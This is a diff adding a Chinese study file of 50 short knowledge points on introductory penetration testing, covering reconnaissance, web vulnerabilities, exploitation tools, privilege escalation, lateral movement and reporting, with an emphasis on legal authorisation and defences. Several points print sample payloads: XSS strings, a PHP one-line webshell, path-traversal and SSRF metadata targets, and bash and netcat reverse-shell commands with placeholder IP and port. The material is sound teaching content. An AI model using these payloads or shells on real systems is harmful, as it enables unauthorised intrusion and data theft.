@@ -1,0 +1,104 @@
+# 2025渗透测试入门
+# 领域: 计算机IT
+# 学科: 网络安全
+# 来源: 2025渗透测试入门
+
+{{知识点1}}{{渗透测试定义：渗透测试（Penetration Testing）是一种通过模拟恶意攻击者的方法和技术，对目标系统、网络或应用程序进行安全性评估的授权测试活动。目的是在攻击者之前发现安全漏洞，评估安全防护能力，提出修复建议。渗透测试必须在获得合法授权的前提下进行，未经授权的测试属于违法行为。}}
+
+{{知识点2}}{{渗透测试分类：按测试目标分为Web应用渗透、网络渗透、移动应用渗透、物联网渗透、社会工程学测试、物理渗透测试等。按测试信息量分为黑盒测试（无内部信息）、白盒测试（完全了解内部架构）、灰盒测试（部分了解内部信息）。按测试位置分为内网渗透和外网渗透。}}
+
+{{知识点3}}{{渗透测试方法论：主流方法论包括OWASP Testing Guide（Web应用）、PTES（渗透测试执行标准，含7个阶段）、OSSTMM（开源安全测试方法手册）、NIST SP 800-115等。PTES的7个阶段：前期交互、情报收集、威胁建模、漏洞分析、渗透攻击、后渗透、报告撰写。}}
+
+{{知识点4}}{{法律与道德约束：渗透测试必须获得书面授权，明确测试范围、时间窗口和测试方法。中国《网络安全法》《刑法》第285条（非法侵入计算机信息系统罪）和第286条（破坏计算机信息系统罪）对未授权入侵有严格处罚。测试人员需签署保密协议（NDA），测试数据不得泄露。}}
+
+{{知识点5}}{{Kali Linux：最流行的渗透测试操作系统，基于Debian，由Offensive Security维护。内置600+安全工具，涵盖信息收集、漏洞分析、Web应用分析、密码攻击、无线攻击、渗透利用、逆向工程等类别。2025版默认使用Xfce桌面环境，支持ARM和云部署。}}
+
+{{知识点6}}{{信息收集概述：信息收集（Reconnaissance）是渗透测试的第一步，分为主动信息收集和被动信息收集。主动信息收集直接与目标交互（如端口扫描、服务探测），被动信息收集不直接接触目标（如搜索引擎、WHOIS查询）。信息收集的质量直接影响后续渗透的成功率。}}
+
+{{知识点7}}{{被动信息收集技术：包括WHOIS查询（域名注册信息）、DNS记录查询（A/MX/NS/TXT记录）、搜索引擎Dork（Google Hacking）、Shodan/Censys网络空间搜索引擎、社交媒体信息收集、GitHub代码泄露搜索、子域名枚举（通过证书透明度日志CT logs）、历史快照（Wayback Machine）等。}}
+
+{{知识点8}}{{主动信息收集技术：包括端口扫描（TCP/UDP）、服务版本探测、操作系统指纹识别、Web应用指纹识别（Wappalyzer/WhatWeb）、目录和文件枚举（dirsearch/gobuster）、虚拟主机发现、WAF检测（wafw00f）、网络拓扑发现（traceroute）等。主动收集会留下日志痕迹，需注意隐蔽性。}}
+
+{{知识点9}}{{Nmap详解：Nmap是网络扫描的瑞士军刀，支持主机发现（-sn）、端口扫描（-sS/-sT/-sU/-sV）、脚本扫描（NSE）、操作系统检测（-O）等。常用扫描类型：SYN扫描（-sS，半开放扫描，速度快且隐蔽）、全连接扫描（-sT）、UDP扫描（-sU）。NSE脚本可进行漏洞检测、后门发现等高级操作。}}
+
+{{知识点10}}{{Nmap扫描技术进阶：时间模板（-T0到-T5）控制扫描速度，-T4适合大多数场景。防火墙/IDS规避技术包括：分片扫描（-f）、诱饵扫描（-D）、源端口欺骗（--source-port）、慢速扫描（-T0/T1）。服务版本探测（-sV）可识别具体软件版本，为漏洞利用提供依据。}}
+
+{{知识点11}}{{DNS枚举与区域传输：DNS区域传输（AXFR）可获取整个域的所有DNS记录，是严重的信息泄露。工具：dnsenum、dnsrecon、fierce。子域名枚举工具：subfinder、amass、sublist3r。DNS爆破通过字典猜测子域名。DNS重绑定攻击可用于绕过同源策略。}}
+
+{{知识点12}}{{Web应用渗透测试基础：Web渗透是渗透测试中最常见的类型。需要理解HTTP/HTTPS协议（请求方法、状态码、头部字段）、Cookie与Session机制、同源策略（SOP）、CORS、RESTful API架构、前后端分离架构等Web基础知识。Burp Suite是Web渗透测试的核心代理工具。}}
+
+{{知识点13}}{{OWASP Top 10 (2021)：Web应用最关键的安全风险包括A01访问控制失效（Broken Access Control）、A02加密失败（Cryptographic Failures）、A03注入（Injection）、A04不安全设计（Insecure Design）、A05安全配置错误（Security Misconfiguration）、A06易受攻击和过时的组件、A07身份认证失败、A08软件和数据完整性故障、A09安全日志和监控失败、A10服务端请求伪造（SSRF）。}}
+
+{{知识点14}}{{SQL注入原理：SQL注入（SQLi）是通过将恶意SQL语句插入应用程序输入参数，使后端数据库执行非预期操作的攻击技术。根本原因是未对用户输入进行参数化处理或有效过滤。SQL注入可分为：联合查询注入（UNION-based）、布尔盲注（Boolean-based blind）、时间盲注（Time-based blind）、报错注入（Error-based）、堆叠查询（Stacked queries）。}}
+
+{{知识点15}}{{SQL注入利用：使用sqlmap自动化工具进行检测和利用。手工注入步骤：1.判断注入点（单引号/双引号测试）2.判断注入类型（数字型/字符型）3.判断列数（ORDER BY）4.判断显示位（UNION SELECT）5.获取数据库信息（database()/version()/user()）6.获取表名、列名、数据。读写文件：LOAD_FILE()读取文件、INTO OUTFILE写入文件。}}
+
+{{知识点16}}{{SQL注入防御：核心防御是使用参数化查询（Prepared Statements）和ORM框架。输入验证（白名单过滤）、最小权限原则（数据库账户权限最小化）、WAF部署、错误信息不返回给客户端、定期安全审计和代码审查。存储过程在正确使用时也可防止SQL注入。}}
+
+{{知识点17}}{{XSS跨站脚本攻击：XSS（Cross-Site Scripting）是将恶意脚本注入到网页中，在其他用户浏览器中执行的攻击。分为三种类型：反射型XSS（Reflected，恶意脚本在URL参数中）、存储型XSS（Stored，恶意脚本存储在服务器数据库中，危害最大）、DOM型XSS（前端JavaScript处理不当导致）。XSS可窃取Cookie、会话劫持、钓鱼、键盘记录等。}}
+
+{{知识点18}}{{XSS利用与防御：常见Payload：<script>alert(1)</script>、<img onerror=alert(1) src=x>、事件处理器（onload/onerror/onfocus/onmouseover）、JavaScript伪协议（javascript:alert(1)）。绕过技巧：大小写混淆、编码绕过（HTML实体/URL编码/Unicode）、双写标签、利用SVG/MathML标签。防御：输出编码（HTML/JS/URL上下文）、CSP（内容安全策略）、HttpOnly Cookie、输入验证。}}
+
+{{知识点19}}{{CSRF跨站请求伪造：CSRF（Cross-Site Request Forgery）是利用用户已认证的会话，诱导用户浏览器发送恶意请求的攻击。攻击者构造恶意页面，当已登录用户访问时，浏览器自动携带Cookie发送请求。防御：CSRF Token（同步令牌模式）、SameSite Cookie属性、验证Referer/Origin头、关键操作二次确认。CSRF与XSS的区别：XSS利用用户对网站的信任，CSRF利用网站对用户的信任。}}
+
+{{知识点20}}{{文件上传漏洞：文件上传漏洞是Web应用允许用户上传文件但未充分验证文件类型、内容或大小导致的安全问题。攻击者可上传WebShell（如PHP一句话木马<?php eval($_POST['cmd']); ?>）获取服务器控制权限。绕过技巧：修改Content-Type、文件后缀大小写混淆、双扩展名（shell.php.jpg）、.htaccess上传、图片马（在图片中嵌入代码）、00截断（%00）、竞争条件上传。防御：白名单验证、重命名文件、存储目录禁止执行、文件内容检测。}}
+
+{{知识点21}}{{命令注入：命令注入（Command Injection）是通过将操作系统命令注入到应用程序参数中，使服务器执行非预期系统命令。常见注入符：|（管道）、&&（逻辑与）、||（逻辑或）、;（分号）、``（反引号）、$()（命令替换）。绕过技巧：空格绕过（${IFS}、<、%09）、黑名单绕过（变量拼接、引号插入、通配符）、Base64编码绕过。防御：避免使用system/exec等函数，使用白名单输入验证。}}
+
+{{知识点22}}{{目录遍历与文件包含：目录遍历（Path Traversal）通过../等路径穿越字符访问受限目录文件，如../../../../etc/passwd。本地文件包含（LFI）利用include/require等函数包含本地文件，可配合日志投毒、PHP伪协议（php://filter/convert.base64-encode/resource=file）利用。远程文件包含（RFI）包含远程URL的恶意代码，需allow_url_include开启。防御：输入白名单、禁用远程包含、open_basedir限制。}}
+
+{{知识点23}}{{SSRF服务端请求伪造：SSRF（Server-Side Request Forgery）是利用服务器端发起请求的功能，让服务器访问内部或受限资源。危害：探测内网服务（127.0.0.1、192.168.x.x）、读取本地文件（file:///etc/passwd）、攻击内网应用、利用云服务元数据（http://169.254.169.254/latest/meta-data/）。绕过技巧：IP地址进制转换、DNS重绑定、URL解析差异、利用302跳转。防御：限制请求目标白名单、禁用非HTTP协议、禁用重定向。}}
+
+{{知识点24}}{{XXE外部实体注入：XXE（XML External Entity）是利用XML解析器处理外部实体引用的功能进行攻击。可实现文件读取（file:///etc/passwd）、SSRF、拒绝服务（Billion Laughs攻击）、远程代码执行（通过expect://等PHP伪协议）。防御：禁用DTD和外部实体解析（libxml_disable_entity_loader）、使用JSON替代XML、输入验证。新版OWASP Top 10中XXE归入A05安全配置错误。}}
+
+{{知识点25}}{{逻辑漏洞：逻辑漏洞是业务逻辑设计缺陷导致的安全问题，无法被自动化扫描器发现，需要人工测试。常见类型：越权访问（水平越权：访问同级用户数据；垂直越权：低权限用户获取高权限功能）、支付逻辑漏洞（修改价格/数量/优惠券）、验证码绕过、密码重置逻辑漏洞、竞争条件（Race Condition）、业务流程绕过（跳过必要步骤）。}}
+
+{{知识点26}}{{身份认证攻击：常见攻击包括：暴力破解（Brute Force）、字典攻击、撞库攻击（Credential Stuffing）、密码喷洒（Password Spraying）、默认凭据、Session固定攻击、JWT攻击（算法篡改为none、密钥爆破、kid注入）。防御：账户锁定策略、多因素认证（MFA）、密码复杂度要求、安全的密码存储（bcrypt/scrypt/Argon2）、Session ID随机性和过期策略。}}
+
+{{知识点27}}{{信息泄露与敏感数据：常见信息泄露源：服务器错误信息（堆栈跟踪、SQL报错）、响应头信息（Server/X-Powered-By）、.git/.svn源码泄露、备份文件（.bak/.old/.swp）、调试模式开启、API文档泄露（Swagger）、硬编码密钥/凭据、注释中的敏感信息。工具：GitHack、svn-exploit、敏感文件扫描器。防御：关闭调试模式、移除敏感信息、最小化错误信息。}}
+
+{{知识点28}}{{中间件与服务器漏洞：常见中间件漏洞：Apache（解析漏洞、CVE-2021-41773路径穿越）、Nginx（解析漏洞、配置错误）、Tomcat（Manager弱口令、CVE-2017-12615 PUT上传）、IIS（短文件名泄露、WebDAV、解析漏洞）、JBoss（反序列化、Invoker Servlet）。识别工具：Wappalyzer、WhatWeb、Nmap服务版本探测。及时更新补丁和安全配置是关键。}}
+
+{{知识点29}}{{CMS与框架漏洞：常见CMS漏洞：WordPress（插件漏洞、Timthumb漏洞、XMLRPC滥用）、Drupal（Drupalgeddon系列）、Joomla（反序列化漏洞）、ThinkPHP（RCE漏洞如5.x远程代码执行）、Struts2（S2-045/S2-046等OGNL表达式注入）、Spring（Spring4Shell CVE-2022-22965）、Log4j（Log4Shell CVE-2021-44228 JNDI注入）。工具：CMS-Scan、CMSmap。}}
+
+{{知识点30}}{{反序列化漏洞：序列化是将对象转换为可存储/传输格式的过程，反序列化是其逆过程。当应用反序列化不可信数据时，可能触发任意代码执行。Java反序列化（Apache Commons Collections链、ysoserial工具）、PHP反序列化（__wakeup/__destruct魔术方法）、Python pickle反序列化。防御：避免反序列化不可信数据、使用签名验证、类型限制白名单。}}
+
+{{知识点31}}{{密码攻击技术：在线攻击：暴力破解、字典攻击、撞库、密码喷洒。离线攻击：获取密码哈希后本地破解。哈希破解工具：Hashcat（GPU加速）、John the Ripper。彩虹表攻击针对无盐哈希。常见哈希类型识别：MD5（32位十六进制）、SHA1（40位）、NTLM（32位）、bcrypt（$2a$/$2b$前缀）。防御：加盐哈希、慢哈希算法（Argon2/bcrypt）、强密码策略。}}
+
+{{知识点32}}{{Metasploit框架：Metasploit是最流行的渗透测试框架，包含大量exploit、payload、auxiliary模块。核心概念：Exploit（利用模块）、Payload（攻击载荷，分singles/stages/stagers）、Encoder（编码器，绕过检测）、Meterpreter（高级Payload，内存中运行的后渗透工具）。常用命令：search、use、show options、set、exploit/run、sessions。辅助模块包括扫描器、信息收集、DoS等。}}
+
+{{知识点33}}{{后渗透技术：获取初始访问后进行的深入操作。信息收集：系统信息（sysinfo）、网络信息（ipconfig/ifconfig）、用户信息（getuid）、进程列表（ps）、已安装软件。权限提升：Windows（Token窃取、UAC绕过、内核漏洞）、Linux（SUID滥用、sudo配置错误、内核漏洞）。持久化：后门账户、计划任务、注册表自启动、WebShell。横向移动：Pass the Hash、Pass the Ticket、SMB Relay。}}
+
+{{知识点34}}{{提权技术（Privilege Escalation）：Linux提权：SUID/SGID二进制利用（GTFOBins）、sudo -l配置错误、cron任务滥用、内核漏洞（Dirty COW、Dirty Pipe）、PATH环境变量劫持、capabilities滥用。Windows提权：Token模拟与窃取（Potato系列）、Always Install Elevated、Unquoted Service Path、DLL劫持、注册表自启动、内核漏洞（PrintNightmare等）。工具：LinPEAS/WinPEAS、linux-exploit-suggester。}}
+
+{{知识点35}}{{内网渗透基础：内网渗透是在获得内网立足点后的横向扩展。关键概念：域控制器（DC）、Active Directory（AD）、Kerberos认证协议、NTLM认证。常用技术：端口转发与代理（frp、chisel、reGeorg、Neo-reGeorg）、内网信息收集（BloodHound、ADFind）、哈希获取（Mimikatz、secretsdump）、Kerberoasting、AS-REP Roasting、Pass the Hash/Ticket、DCSync攻击。}}
+
+{{知识点36}}{{横向移动技术：Pass the Hash（PTH）：使用NTLM哈希直接认证而无需明文密码。Pass the Ticket（PTT）：使用Kerberos票据进行认证。SMB Relay：拦截NTLM认证并转发到目标。PsExec/WMI/WinRM远程执行。DCSync：模拟域控制器复制凭据。工具：CrackMapExec（网络协议批量利用）、Impacket库（Python网络协议工具集）、Evil-WinRM。}}
+
+{{知识点37}}{{内网隧道与代理：当目标在内网无法直接访问时，需要建立隧道。正向代理：目标机器主动连接攻击者。反向代理：攻击者连接到已建立的隧道。工具：frp（高性能反向代理）、chisel（HTTP隧道）、reGeorg/Neo-reGeorg（WebShell隧道）、EarthWorm/iox（多级代理）、SSH隧道（本地转发-L/远程转发-R/动态转发-D）、proxychains配合使用。SOCKS5代理可将内网流量路由到目标。}}
+
+{{知识点38}}{{社会工程学：利用人性弱点获取信息或访问权限的技术。常见手段：钓鱼攻击（Phishing，伪造邮件/网站窃取凭据）、鱼叉式钓鱼（Spear Phishing，针对特定目标）、水坑攻击（Watering Hole，感染目标常访问的网站）、USB drop attack（投放含恶意程序的U盘）、电话诈骗（Vishing）、短信诈骗（Smishing）。工具：SET（Social Engineering Toolkit）、Gophish（钓鱼平台）。防御：安全意识培训、邮件过滤、多因素认证。}}
+
+{{知识点39}}{{无线网络安全测试：WiFi安全协议演进：WEP（已破解）→ WPA → WPA2（AES-CCMP）→ WPA3（SAE）。WPA2-PSK破解：抓取四次握手包（airodump-ng）+ 离线字典破解（aircrack-ng/hashcat）。PMKID攻击无需客户端在线。Evil Twin攻击：搭建同名钓鱼AP。WPS暴力破解（reaver/bully）。工具套件：Aircrack-ng、Wifite2、Bettercap。企业级WiFi可进行802.1X认证攻击。}}
+
+{{知识点40}}{{漏洞扫描工具：Nessus（商业漏洞扫描器，功能全面）、OpenVAS（开源漏洞扫描框架）、Nikto（Web服务器扫描器）、Nuclei（基于模板的快速漏洞扫描器，社区模板丰富）、Xray（长亭科技安全评估工具）、SQLMap（SQL注入自动化检测与利用）、WPScan（WordPress专用扫描器）、Arachni（Web应用扫描器）。扫描结果需人工验证，避免误报。}}
+
+{{知识点41}}{{Burp Suite使用：Web渗透测试核心工具，包含Proxy（代理拦截）、Repeater（手动重放请求）、Intruder（自动化攻击，支持Sniper/Battering Ram/Pitchfork/Cluster Bomb四种模式）、Scanner（漏洞扫描）、Decoder（编解码）、Comparer（对比）、Sequencer（随机性分析）。常用功能：拦截修改请求、自动化Fuzzing、Session Token分析、JWT解码修改。社区版免费，Professional版功能更强大。}}
+
+{{知识点42}}{{代理与抓包工具：除了Burp Suite外，常用工具包括：mitmproxy（Python中间人代理，支持脚本扩展）、Charles/Fiddler（HTTP/HTTPS代理）、Wireshark（网络协议分析，抓包之王）、tcpdump（命令行抓包）。HTTPS抓包需安装CA证书。移动端抓包需配置代理和安装证书，部分APP有证书固定（Certificate Pinning）需用Frida/Xposed绕过。}}
+
+{{知识点43}}{{编码与加密基础：渗透测试中常用编码：Base64（A-Za-z0-9+/）、URL编码（%xx）、HTML实体编码（&#xx;或&entity;）、十六进制编码（0x）、Unicode编码（\uXXXX）。常见加密算法：对称加密（AES/DES/3DES）、非对称加密（RSA/ECC）、哈希算法（MD5/SHA1/SHA256）。JWT（JSON Web Token）由Header.Payload.Signature三部分组成，常用于身份认证。}}
+
+{{知识点44}}{{Python在渗透测试中的应用：Python是渗透测试脚本编写的首选语言。常用库：requests（HTTP请求）、socket（网络编程）、scapy（数据包构造与嗅探）、paramiko（SSH连接）、pwntools（CTF/exploit开发）、BeautifulSoup（HTML解析）、Impacket（Windows协议工具）。编写自定义漏洞PoC、自动化扫描脚本、信息收集工具、反弹Shell脚本等。}}
+
+{{知识点45}}{{Shell与反弹Shell：Shell类型：正向Shell（目标机器监听，攻击者连接）和反向Shell（攻击者监听，目标机器连接）。常见反弹Shell命令：Bash（bash -i >& /dev/tcp/IP/PORT 0>&1）、Python、PHP、Netcat（nc -e /bin/bash）、PowerShell、Socat。Shell升级为交互式：python -c 'import pty;pty.spawn("/bin/bash")'。工具：Reverse Shell Generator在线工具可快速生成各种语言的反弹Shell命令。}}
+
+{{知识点46}}{{日志分析与应急响应：渗透测试报告阶段需要分析日志。常见日志：Web访问日志（access.log）、系统日志（syslog/Windows Event Log）、数据库日志、防火墙日志、IDS/IPS日志。分析要点：异常IP、异常时间访问、可疑URL请求、错误日志激增、异常进程和连接。工具：ELK Stack（日志收集分析平台）、Splunk、grep/awk命令行分析。应急响应流程：准备→识别→遏制→根除→恢复→总结。}}
+
+{{知识点47}}{{CTF竞赛与靶场练习：CTF（Capture The Flag）是安全技术竞赛，题型包括Web、Pwn（二进制）、Crypto（密码学）、Reverse（逆向）、Misc（杂项）。在线靶场：Hack The Box、TryHackMe、VulnHub（虚拟机靶场）、DVWA（Web漏洞练习平台）、pikachu靶场、sqli-labs（SQL注入练习）、PortSwigger Web Security Academy（Burp官方免费Web安全学院）。坚持练习是提升渗透测试技能的关键。}}
+
+{{知识点48}}{{渗透测试报告撰写：报告是渗透测试最重要的交付物。报告结构：1.执行摘要（概述发现和风险等级）2.测试范围和方法 3.漏洞详情（漏洞描述、影响、复现步骤、风险等级CVSS评分、修复建议）4.附录（工具列表、原始数据）。风险等级通常分为：严重（Critical）、高危（High）、中危（Medium）、低危（Low）、信息（Info）。好的报告应可操作、可验证、面向管理层和技术人员。}}
+
+{{知识点49}}{{2025年新兴威胁与趋势：AI驱动的攻击与防御（Deepfake社会工程、AI辅助漏洞挖掘）、供应链攻击持续增长（SolarWinds类型攻击）、零日漏洞利用增多、API安全成为重点（OWASP API Security Top 10）、云原生安全（容器逃逸、K8s安全）、勒索软件即服务（RaaS）、物联网（IoT）和OT安全威胁加剧、量子计算对密码学的潜在冲击。渗透测试人员需持续学习新技术。}}
+
+{{知识点50}}{{安全认证与职业发展：主流认证：OSCP（Offensive Security Certified Professional，实战性强，需在24小时内完成渗透测试考试）、CEH（Certified Ethical Hacker，理论为主）、PNPT（TCM Security，实战认证）、CPTS（Hack The Box认证）、CRTO（Red Team Ops）、OSWE（Web应用专家级）。学习路径：基础知识（网络/操作系统/编程）→ Web安全 → 内网渗透 → 红队技术。持续关注CVE、安全社区（先知社区、FreeBuf、安全客）、参与CTF和Bug Bounty。}}
